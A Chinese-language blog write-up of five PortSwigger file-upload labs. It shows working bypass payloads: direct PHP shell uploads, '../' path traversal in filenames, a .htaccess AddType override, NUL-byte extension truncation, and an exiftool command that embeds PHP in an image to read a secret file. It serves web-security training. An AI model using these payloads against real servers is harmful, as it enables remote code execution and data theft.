---
date: 2026-10-20
slug: portswigger-file-upload
categories:
  - 文件上传
  - PortSwigger
---

# PortSwigger 文件上传 5 关复盘

从"能上传"到"能执行"，中间隔了三道门。

## 三道防线

```text
① 文件名格式校验   字符白名单 ^[a-zA-Z0-9._-]+$
② 扩展名黑/白名单   .php 被拒
③ Web 服务器 handler 没有该后缀 → 当静态文件返回
```

**四种报错形态直接对应四层：**

| 你看到的 | 卡在哪 |
|---|---|
| 400 + JSON | 应用层格式校验 |
| 正常页 + "不允许" | 应用层扩展名校验 |
| 403 | 权限 |
| **200 + 源码** | **服务器 handler 缺失** |
| 200 + 输出 | 成功 |

## 第 1 关：直接上传

传 `.php`（内容是 shell），访问 `/files/avatars/shell.php`。

**卡点：路径找错。**

```
❌ /my-account/avatar/shell.php     ← 这是上传接口
✅ /files/avatars/shell.php         ← 这是文件目录
```

**找路径的办法：打开"显示这个文件"的页面，看 `<img src>`。**

## 第 2 关：路径穿越

```http
filename="../shell.php"
```

**判断穿越成功没有，看响应字符串：**

```
The file avatars/shell.php has been uploaded      → ../ 被吃掉
The file avatars/../shell.php has been uploaded   → 穿越成功 ✅
```

**访问时不要带 `..`：**

```
❌ /files/avatars/../shell.php
✅ /files/shell.php
```

## 第 3 关：扩展名黑名单

```
aa.php      → 被拒
aa.pHp5     → 上传成功,但访问返回源码(没有 .php5 的 handler)
```

**解法：上传 `.htaccess` 改规则**

```apache
AddType application/x-httpd-php .lhm
```

然后传 `shell.lhm` → 执行。

!!! warning "三个拼写陷阱"

    `x-httped-php` → 应为 **`x-httpd-php`**
    `.1hm` → 应为 **`.lhm`**（字母 L，不是数字 1）
    `AddType php .lhm` → MIME 必须写全

## 第 4 关：混淆扩展名

白名单只允许 jpg/png。

```
shell.php        → 拒绝
shell.php.jpg    → 通过,但静态(两边都取最后后缀)
shell.php%00.jpg → 执行 ✅（NUL 截断）
```

**原理：**

```
校验看到:  shell.php\0.jpg  → 以 .jpg 结尾 → 放行
存储使用:  shell.php         → 读到 \0 就停
```

**我试了 `%20` 也能过 —— 说明那个实现按空白截断。但这是巧合，不是通用手法。**

## 第 5 关：多语言文件（polyglot）

题目只接受"合法图片"，改任何后缀都被拒。

**判断：校验的是内容，不是后缀。**

```
改后缀有效   → 查后缀
改后缀无效   → 查内容
```

**解法：把 PHP 写进真实图片的元数据**

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
         photo.jpg -o shell.php
```

**为什么需要 START/END 标记：**

PHP 会把 `<?php ?>` 之外的内容原样输出 —— 响应里混着整张图片的二进制，
标记让 secret 在垃圾数据里可搜索。

## 收获

> **上传题永远先问三个问题：存到哪了、存成什么、那个目录执行不执行 PHP。**
>
> **"能上传"和"能执行"是两件事 —— 绕过校验 ≠ 拿到 shell。**
>
> **遇到"改后缀一直说不是合法图片"，说明它在查内容，别再折腾后缀了。**
